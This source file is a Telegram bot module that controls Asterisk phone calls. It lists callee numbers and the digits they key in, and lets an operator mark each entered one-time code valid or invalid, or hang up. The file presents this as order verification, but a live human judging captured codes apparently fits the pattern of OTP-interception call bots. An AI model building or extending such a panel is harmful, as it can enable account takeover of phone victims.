// telegram_bot/verification.js
const { verifyOTP, getPendingVerifications, activeCalls, pendingVerifications } = require("../asterisk/instance");
const telegramQueue = require("../utils/telegramQueue");

// Improved markdown escaping function for MarkdownV2
function escapeMarkdownV2(text) {
  if (!text) return '';
  return String(text)
    .replace(/\\/g, '\\\\')
    .replace(/_/g, '\\_')
    .replace(/\*/g, '\\*')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)')
    .replace(/~/g, '\\~')
    .replace(/`/g, '\\`')
    .replace(/>/g, '\\>')
    .replace(/#/g, '\\#')
    .replace(/\+/g, '\\+')
    .replace(/-/g, '\\-')
    .replace(/=/g, '\\=')
    .replace(/\|/g, '\\|')
    .replace(/\{/g, '\\{')
    .replace(/\}/g, '\\}')
    .replace(/\./g, '\\.')
    .replace(/!/g, '\\!');
}

// Enhanced verification handling for Telegram bot
function initializeVerificationHandlers(bot) {
  
  // Handle callback queries for verification
  bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const callbackData = query.data;
    
    // Handle verification callbacks
    if (callbackData.startsWith('verify_') || 
        callbackData.startsWith('invalid_') || 
        callbackData.startsWith('hangup_') || 
        callbackData.startsWith('details_')) {
      
      bot.answerCallbackQuery(query.id);
      
      const parts = callbackData.split('_');
      const action = parts[0];
      const callId = `${parts[1]}_${parts[2]}_${parts[3]}`;
      console.log('$#$############### callback query $$$$$$$$$$$$$$$$$$$$$$', callId, query.data)
      switch (action) {
        case 'verify':
          await handleOTPVerification(bot, chatId, callId, true, query);
          break;
          
        case 'invalid':
          await handleOTPVerification(bot, chatId, callId, false, query);
          break;
          
        case 'hangup':
          await handleCallHangup(bot, chatId, callId);
          break;
          
        case 'details':
          await showCallDetails(bot, chatId, callId);
          break;
      }
    }
  });
  
  // Add verification commands
  bot.onText(/\/pending/, async (msg) => {
    const chatId = msg.chat.id;
    await showPendingVerifications(bot, chatId);
  });
  
  bot.onText(/\/active/, async (msg) => {
    const chatId = msg.chat.id;
    await showActiveCalls(bot, chatId);
  });
  
  console.log("Verification handlers initialized");
}

async function handleOTPVerification(bot, chatId, callId, isValid, query = null) {
  try {
    const success = verifyOTP(callId, isValid);
    
    if (success) {
      const verification = pendingVerifications.get(callId);
      const phoneNumber = verification ? verification.phoneNumber : 'Unknown';
      
      const resultMessage = isValid 
        ? `✅ *OTP VERIFIED*\n\n` +
          `Call ID: ${escapeMarkdownV2(callId)}\n` +
          `Phone: ${escapeMarkdownV2(phoneNumber)}\n\n` +
          `Customer has been notified that their order is verified\\. Call will end automatically\\.`
        : `❌ *OTP INVALID*\n\n` +
          `Call ID: ${escapeMarkdownV2(callId)}\n` +
          `Phone: ${escapeMarkdownV2(phoneNumber)}\n\n` +
          `Customer has been notified to try again\\.`;
      
      await telegramQueue.sendMessage(chatId, resultMessage, { parse_mode: "MarkdownV2" });
      
      // Edit the original message to show it's been handled
      if (query) {
        try {
          await bot.editMessageReplyMarkup({}, {
            chat_id: chatId,
            message_id: query.message.message_id
          });
        } catch (editError) {
          // Ignore edit errors
        }
      }
      
    } else {
      await telegramQueue.sendMessage(
        chatId, 
        `❌ *Verification Failed*\n\n` +
        `Call ID: ${escapeMarkdownV2(callId)}\n\n` +
        `Call not found or already processed\\.`,
        { parse_mode: "MarkdownV2" }
      );
    }
    
  } catch (error) {
    console.error('Error handling OTP verification:', error);
    await telegramQueue.sendMessage(
      chatId,
      `❌ *Error*\n\n` +
      `Failed to process verification for Call ID: ${escapeMarkdownV2(callId)}\n\n` +
      `Error: ${escapeMarkdownV2(error.message)}`,
      { parse_mode: "MarkdownV2" }
    );
  }
}

async function handleCallHangup(bot, chatId, callId) {
  try {
    const verification = pendingVerifications.get(callId);
    
    if (verification) {
      const { ami } = require("../asterisk/instance");
      
      // Hangup the call
      ami.action({
        action: "Hangup",
        channel: verification.channel
      }, (err, res) => {
        if (err) {
          console.error('Error hanging up call:', err);
        }
      });
      
      // Clean up
      pendingVerifications.delete(callId);
      
      await telegramQueue.sendMessage(
        chatId,
        `📞 *Call Terminated*\n\n` +
        `Call ID: ${escapeMarkdownV2(callId)}\n` +
        `Phone: ${escapeMarkdownV2(verification.phoneNumber)}\n\n` +
        `Call has been manually terminated by admin\\.`,
        { parse_mode: "MarkdownV2" }
      );
      
    } else {
      await telegramQueue.sendMessage(
        chatId,
        `❌ *Call Not Found*\n\n` +
        `Call ID: ${escapeMarkdownV2(callId)}\n\n` +
        `Call may have already ended or been processed\\.`,
        { parse_mode: "MarkdownV2" }
      );
    }
    
  } catch (error) {
    console.error('Error hanging up call:', error);
    await telegramQueue.sendMessage(
      chatId,
      `❌ Error terminating call: ${escapeMarkdownV2(error.message)}`,
      { parse_mode: "MarkdownV2" }
    );
  }
}

async function showCallDetails(bot, chatId, callId) {
  try {
    const verification = pendingVerifications.get(callId);
    
    if (verification) {
      const duration = new Date() - verification.timestamp;
      const durationMinutes = Math.floor(duration / 60000);
      const durationSeconds = Math.floor((duration % 60000) / 1000);
      
      let message = `📋 *Call Details*\n\n`;
      message += `🆔 Call ID: ${escapeMarkdownV2(callId)}\n`;
      message += `📞 Phone: ${escapeMarkdownV2(verification.phoneNumber)}\n`;
      message += `📺 Channel: ${escapeMarkdownV2(verification.channel)}\n`;
      message += `⏰ Started: ${escapeMarkdownV2(verification.timestamp.toLocaleString())}\n`;
      message += `⏳ Duration: ${durationMinutes}m ${durationSeconds}s\n`;
      message += `📊 Status: ${escapeMarkdownV2(verification.status)}\n`;
      
      if (verification.otpEnteredTime) {
        message += `🔢 OTP Entered: ${escapeMarkdownV2(verification.otpEnteredTime.toLocaleString())}\n`;
      }
      
      await telegramQueue.sendMessage(chatId, message, { 
        parse_mode: "MarkdownV2",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ Verify OTP", callback_data: `verify_${callId}` },
              { text: "❌ Invalid OTP", callback_data: `invalid_${callId}` }
            ],
            [
              { text: "📞 Hangup Call", callback_data: `hangup_${callId}` }
            ]
          ]
        }
      });
      
    } else {
      await telegramQueue.sendMessage(
        chatId,
        `❌ *Call Not Found*\n\n` +
        `Call ID: ${escapeMarkdownV2(callId)}\n\n` +
        `Call details not available\\.`,
        { parse_mode: "MarkdownV2" }
      );
    }
    
  } catch (error) {
    console.error('Error showing call details:', error);
    await telegramQueue.sendMessage(
      chatId,
      `❌ Error loading call details: ${escapeMarkdownV2(error.message)}`,
      { parse_mode: "MarkdownV2" }
    );
  }
}

async function showPendingVerifications(bot, chatId) {
  try {
    const pending = getPendingVerifications();
    
    if (pending.length === 0) {
      await telegramQueue.sendMessage(
        chatId,
        `📋 *No Pending Verifications*\n\n` +
        `There are currently no calls waiting for OTP verification\\.`,
        { parse_mode: "MarkdownV2" }
      );
      return;
    }
    
    let message = `📋 *Pending OTP Verifications* \\(${pending.length}\\)\n\n`;
    
    pending.forEach((verification, index) => {
      const duration = new Date() - verification.timestamp;
      const durationMinutes = Math.floor(duration / 60000);
      
      message += `${index + 1}\\. 📞 ${escapeMarkdownV2(verification.phoneNumber)}\n`;
      message += `   🆔 ${escapeMarkdownV2(verification.callId)}\n`;
      message += `   ⏳ ${durationMinutes}m ago\n\n`;
    });
    
    // Create inline keyboard for each pending verification
    const keyboard = {
      inline_keyboard: pending.map(verification => [
        { text: `📞 ${verification.phoneNumber}`, callback_data: `details_${verification.callId}` }
      ])
    };
    
    await telegramQueue.sendMessage(chatId, message, { 
      parse_mode: "MarkdownV2",
      reply_markup: keyboard
    });
    
  } catch (error) {
    console.error('Error showing pending verifications:', error);
    await telegramQueue.sendMessage(
      chatId,
      `❌ Error loading pending verifications: ${escapeMarkdownV2(error.message)}`,
      { parse_mode: "MarkdownV2" }
    );
  }
}

async function showActiveCalls(bot, chatId) {
  try {
    const activeCallsArray = Array.from(activeCalls.entries()).map(([phone, info]) => ({
      phoneNumber: phone,
      ...info
    }));
    
    if (activeCallsArray.length === 0) {
      await telegramQueue.sendMessage(
        chatId,
        `📞 *No Active Calls*\n\n` +
        `There are currently no active calls in progress\\.`,
        { parse_mode: "MarkdownV2" }
      );
      return;
    }
    
    let message = `📞 *Active Calls* \\(${activeCallsArray.length}\\)\n\n`;
    
    activeCallsArray.forEach((call, index) => {
      const duration = new Date() - call.startTime;
      const durationMinutes = Math.floor(duration / 60000);
      const durationSeconds = Math.floor((duration % 60000) / 1000);
      
      message += `${index + 1}\\. 📱 ${escapeMarkdownV2(call.phoneNumber)}\n`;
      message += `   📊 Status: ${escapeMarkdownV2(call.status)}\n`;
      message += `   ⏰ Duration: ${durationMinutes}m ${durationSeconds}s\n`;
      if (call.dtmfPressed) {
        message += `   🔢 Pressed: ${escapeMarkdownV2(call.dtmfPressed)}\n`;
      }
      if (call.callId) {
        message += `   🆔 Call ID: ${escapeMarkdownV2(call.callId)}\n`;
      }
      message += `\n`;
    });
    
    await telegramQueue.sendMessage(chatId, message, { parse_mode: "MarkdownV2" });
    
  } catch (error) {
    console.error('Error showing active calls:', error);
    await telegramQueue.sendMessage(
      chatId,
      `❌ Error loading active calls: ${escapeMarkdownV2(error.message)}`,
      { parse_mode: "MarkdownV2" }
    );
  }
}

module.exports = {
  initializeVerificationHandlers,
  handleOTPVerification,
  showPendingVerifications,
  showActiveCalls
};